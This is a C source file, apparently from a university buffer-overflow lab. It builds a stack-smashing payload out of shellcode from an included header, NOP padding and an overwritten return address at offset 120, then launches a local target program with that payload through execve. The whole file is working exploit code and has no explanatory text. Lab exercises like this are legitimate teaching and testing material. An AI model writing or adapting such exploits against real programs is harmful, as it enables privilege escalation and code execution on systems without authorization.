#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define DEBUG 0

int
main ( int argc, char * argv[] )
{
	char*	args[3];
	char*	env[1];
	char exploit[125];
	int i = 0;

	strcpy(exploit, shellcode);
	for (i = 45; i < 125; i++) {
		exploit[i] = *NOP;
	}

	int return_add = 0x2021fe10;
	int* ret_in_exploit = (int*) (exploit + 120);
	*ret_in_exploit = return_add; 
	exploit[124] = '\0';
	args[0] = TARGET;
	args[1] = exploit;
	if (DEBUG) {
		printf("Length: %d\n", strlen(exploit));
		// Print out buffer to debug	
		for (i = 0; i < 125; i++) {
			printf("%x ", 0xff & exploit[i]);
		}
		fflush(stdout);
	}
	args[2] = NULL;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
